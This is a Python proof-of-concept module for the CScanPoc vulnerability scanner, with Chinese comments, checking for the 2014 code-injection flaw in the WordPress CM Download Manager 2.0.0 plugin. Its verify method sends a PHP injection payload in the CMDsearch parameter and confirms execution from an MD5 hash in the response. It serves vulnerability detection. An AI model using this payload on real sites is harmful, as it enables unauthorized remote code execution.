# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib,urllib2
import re
import hashlib

class Vuln(ABVuln):
    vuln_id = 'WordPress_0016' # 平台漏洞编号，留空
    name = 'WordPress CM Download Manager 2.0.0 代码执行漏洞' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = '2014-11-21'  # 漏洞公布时间
    desc = '''
       代码注入漏洞已被发现并在软件内确认为匿名用户。成功的攻击可以让匿名攻击者获得完全控制权。
       应用程序和使用任何可用的操作系统功能的能力脚本环境。 
    ''' # 漏洞描述
    ref = '' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress CM Download Manager 2.0.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'cebd008a-47c1-418b-9e3e-021229a8bb41'
    author = '国光'  # POC编写者
    create_date = '2018-05-10' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/cmdownloads/?CMDsearch=".md5(bb2)."'
            verify_url = '{target}'.format(target=self.target)+payload
            response = urllib2.urlopen(verify_url)
            content = response.read()
            match = re.search('0c72305dbeb0ed430b79ec9fc5fe8505', content)
            if match:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()